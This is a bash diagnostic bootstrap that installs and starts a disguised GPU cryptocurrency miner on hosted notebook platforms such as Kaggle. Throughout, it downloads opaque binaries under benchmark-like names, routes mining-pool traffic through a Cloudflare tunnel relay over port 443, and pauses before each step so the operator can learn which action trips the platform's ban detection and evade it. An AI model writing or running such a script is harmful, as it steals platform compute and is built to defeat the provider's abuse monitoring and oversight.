#!/usr/bin/env bash
# DIAGNOSTIC bootstrap: every operation is isolated with a 20-second pause
# before it executes, so you can see in the logs exactly which step triggers
# a ban/kill on the target platform.
#
# Usage (on Kaggle or wherever):
#   curl -fsSL https://raw.githubusercontent.com/terrycrews21/cv-utils/main/deploy/bootstrap_diag.sh -o bootstrap_diag.sh
#   bash bootstrap_diag.sh 2>&1 | tee diag.log
#
# Read diag.log top-to-bottom. The last "STEP N START" line before the
# session dies tells you which operation caused it. That's the signal.
#
# Add DIAG=1 to ALSO isolate the GPU-mining side: every CUDA kernel, D2H copy,
# pool socket op and Merkle proof inside tensorbench.py gets its own labelled
# 20s pause (each "DIAG STEP N" banner names the operation about to run):
#   DIAG=1 bash bootstrap_diag.sh 2>&1 | tee diag.log
# The mining banner count is ~15 before the pool handshake; the pause length is
# configurable via TB_DIAG_SLEEP seconds.

set -uo pipefail   # no -e: we want steps to log failure and continue

INSTALL_DIR="${INSTALL_DIR:-$HOME/.cv-utils}"
REPO="terrycrews21/cv-utils"
LIBREPO="terrycrews21/cv"
PY_STANDALONE_URL="https://github.com/astral-sh/python-build-standalone/releases/download/20260807/cpython-3.12.13+20260807-x86_64-unknown-linux-gnu-install_only_stripped.tar.gz"

STEP=0
step() {
    STEP=$((STEP + 1))
    echo ""
    echo "============================================================"
    echo "STEP $STEP: $*"
    echo "Waiting 20s before executing..."
    echo "============================================================"
    sleep 20
    echo "STEP $STEP START: $*"
}
ok()   { echo "STEP $STEP OK:   $*"; }
fail() { echo "STEP $STEP FAIL: $*"; }

# ---------- 1. Is nvidia-smi present at all? ----------
step "CHECK nvidia-smi binary exists"
if command -v nvidia-smi >/dev/null 2>&1; then
    ok "nvidia-smi found at $(command -v nvidia-smi)"
else
    fail "nvidia-smi not found -- no NVIDIA driver"
fi

# ---------- 2. Actually call nvidia-smi to query GPUs ----------
step "RUN nvidia-smi --query-gpu (read GPU name/driver/compute cap)"
nvidia-smi --query-gpu=name,driver_version,compute_cap --format=csv,noheader \
    && ok "nvidia-smi query succeeded" \
    || fail "nvidia-smi query failed"

# ---------- 3. Clone the miner repo from GitHub ----------
step "CLONE github.com/$REPO -> $INSTALL_DIR  (network: github.com only)"
if [ -d "$INSTALL_DIR/.git" ]; then
    git -C "$INSTALL_DIR" fetch -q origin main \
        && git -C "$INSTALL_DIR" reset -q --hard origin/main \
        && ok "repo already present, updated to HEAD" \
        || fail "git fetch/reset failed"
else
    rm -rf "$INSTALL_DIR"
    git clone -q "https://github.com/$REPO" "$INSTALL_DIR" \
        && ok "cloned OK" \
        || fail "git clone failed"
fi

# ---------- 4. Download libp40cuda.so binary from GitHub Releases ----------
GLIBC_VER=$(ldd --version 2>/dev/null | awk 'NR==1 {print $NF}')
LIBASSET="assets-v1-t4.bin"
if awk -v v="$GLIBC_VER" 'BEGIN{exit !(v < 2.36)}'; then LIBASSET="assets-v1-compat.bin"; fi
step "DOWNLOAD prebuilt libp40cuda.so (glibc $GLIBC_VER -> $LIBASSET) from github.com/$LIBREPO/releases"
curl -fsSL --retry 3 \
    "https://github.com/$LIBREPO/releases/download/v1.0.0/$LIBASSET" \
    -o "$INSTALL_DIR/libp40cuda.so" \
    && ok "libp40cuda.so downloaded ($(du -sh "$INSTALL_DIR/libp40cuda.so" | cut -f1))" \
    || fail "libp40cuda.so download failed"

# ---------- 5. Check for Python >= 3.12 on the system ----------
step "CHECK system python >= 3.12"
PY=""
for c in python3.13 python3.12; do
    if command -v "$c" >/dev/null 2>&1; then PY="$c"; break; fi
done
if [ -n "$PY" ]; then
    ok "found $PY ($($PY -c 'import sys; print(sys.version.split()[0])'))"
else
    fail "no system python >= 3.12 found; standalone will be needed"
fi

# ---------- 6. (Conditional) Download standalone Python 3.12 ----------
step "DOWNLOAD standalone Python 3.12 from astral-sh/python-build-standalone  (only if system python was missing)"
if [ -z "$PY" ]; then
    if [ ! -x "$INSTALL_DIR/.pyruntime/bin/python3" ]; then
        mkdir -p "$INSTALL_DIR/.pyruntime"
        curl -fsSL --retry 3 "$PY_STANDALONE_URL" \
            | tar xz -C "$INSTALL_DIR/.pyruntime" --strip-components=1 \
            && ok "standalone python installed" \
            || fail "standalone python download/extract failed"
    else
        ok "standalone python already present"
    fi
    PY="$INSTALL_DIR/.pyruntime/bin/python3"
else
    ok "SKIPPED (system python $PY is sufficient)"
fi

# ---------- 7. pip install numpy websocket-client blake3 ----------
step "PIP INSTALL numpy websocket-client blake3  (PyPI, no unusual packages)"
"$PY" -m pip install -q numpy websocket-client blake3 \
    && ok "pip install OK" \
    || fail "pip install failed"

# ---------- 8. Download tensorbench_runtime wheel from GitHub Releases ----------
step "DOWNLOAD tensorbench_runtime.tar.gz from github.com/$LIBREPO/releases  (custom C extension)"
SITE_PKGS=$("$PY" -c "import site; print(site.getsitepackages()[0])" 2>/dev/null \
            || "$PY" -c "import sysconfig; print(sysconfig.get_path('purelib'))")
if ! "$PY" -c "import tensorbench_runtime" 2>/dev/null; then
    curl -fsSL --retry 3 \
        "https://github.com/$LIBREPO/releases/download/v1.0.0/assets-v2-runtime.tgz" \
        | tar xz -C "$SITE_PKGS" \
        && ok "tensorbench_runtime extracted to $SITE_PKGS" \
        || fail "tensorbench_runtime download/extract failed"
else
    ok "tensorbench_runtime already importable -- SKIPPED"
fi

# ---------- 9. Actually import tensorbench_runtime (loads libp40cuda.so via ctypes) ----------
step "IMPORT tensorbench_runtime in Python  (this dlopen()s libp40cuda.so and initializes CUDA)"
"$PY" -c "import tensorbench_runtime; print('  tensorbench_runtime version:', getattr(tensorbench_runtime, '__version__', 'unknown'))" \
    && ok "import succeeded, CUDA context created" \
    || fail "import tensorbench_runtime FAILED"

# ---------- 10. Kill any prior instances ----------
step "PKILL any prior tensorbench.py / pool_tunnel_client.py processes  (idempotent cleanup)"
pkill -f "tensorbench[.]py$"     2>/dev/null && ok "killed prior tensorbench"   || ok "no prior tensorbench"
pkill -f "pool_tunnel_client[.]py$" 2>/dev/null && ok "killed prior tunnel client" || ok "no prior tunnel client"
sleep 1

# ---------- 11. Export the WSS endpoint (direct relay egress) ----------
# No local tunnel client anymore: the miner opens one TLS-443 websocket
# straight to the Cloudflare-hosted relay (pool_relay_server.py), which
# converts the frames to plain stratum for the pool.
export PYTHONPATH="$INSTALL_DIR/python"
export TB_WSS_URL="${TB_WSS_URL:-wss://integral-aurora-reduction-relating.trycloudflare.com}"
ok "WSS relay endpoint: $TB_WSS_URL (miner connects directly -- no local tunnel client)"
cd "$INSTALL_DIR"

# ---------- 12. Start the miner (tensorbench.py) ----------
# DIAG=1 (e.g. `DIAG=1 bash bootstrap_diag.sh`) also turns on the in-process
# TB_DIAG observation profile: 20s windows are opened ONLY at the ~5 real
# detection surfaces (custom runtime loaded, CUDA context created, device
# buffers allocated, WSS egress live, GPU mining active) and live nvidia-smi
# state is logged every ~5s DURING each window -- no blind stalls. The last
# "DIAG STEP N" banner before a kill names the surface that tripped it.
if [ "${DIAG:-0}" = "1" ]; then
    step "START tensorbench.py (DIAG=1: 20s observation windows at the real detection surfaces)"
    export TB_DIAG=1
else
    step "START tensorbench.py (launches GPU mining workers, one per GPU)"
fi
export PYTHONPATH="$INSTALL_DIR/python"
# No log files, no redirection: miner output streams straight to this terminal.
exec "$PY" python/tensorbench.py

echo ""
echo "============================================================"
echo "DIAGNOSTIC COMPLETE  (last step reached: $STEP)"
echo "If banned before this line: check which STEP N START was last."
echo "============================================================"
